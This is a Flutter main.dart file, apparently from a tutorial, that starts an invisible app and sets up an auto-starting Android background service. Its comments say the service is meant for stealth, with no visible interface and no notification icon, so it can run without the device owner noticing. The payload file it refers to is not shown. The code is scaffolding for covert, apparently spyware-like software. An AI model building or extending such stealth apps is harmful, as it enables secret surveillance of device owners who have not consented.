import 'package:flutter/material.dart';
import 'package:flutter_background_service/flutter_background_service.dart';
import 'background_service.dart'; // We'll create this file next

void main() async {
  // This makes sure everything is ready before the app starts.
  WidgetsFlutterBinding.ensureInitialized();
  // Fire up the background service we're about to write.
  await initializeService();
  // Run an empty, invisible app. Stealthy.
  runApp(const SizedBox.shrink());
}

Future<void> initializeService() async {
  final service = FlutterBackgroundService();
  await service.configure(
    androidConfiguration: AndroidConfiguration(
      // This is the function that runs when the service starts.
      onStart: onStart,
      // Crucial for stealth. We don't want a persistent notification icon.
      isForegroundMode: false,
      autoStart: true,
    ),
    iosConfiguration: IosConfiguration(), // Not relevant for this project, but required.
  );
}
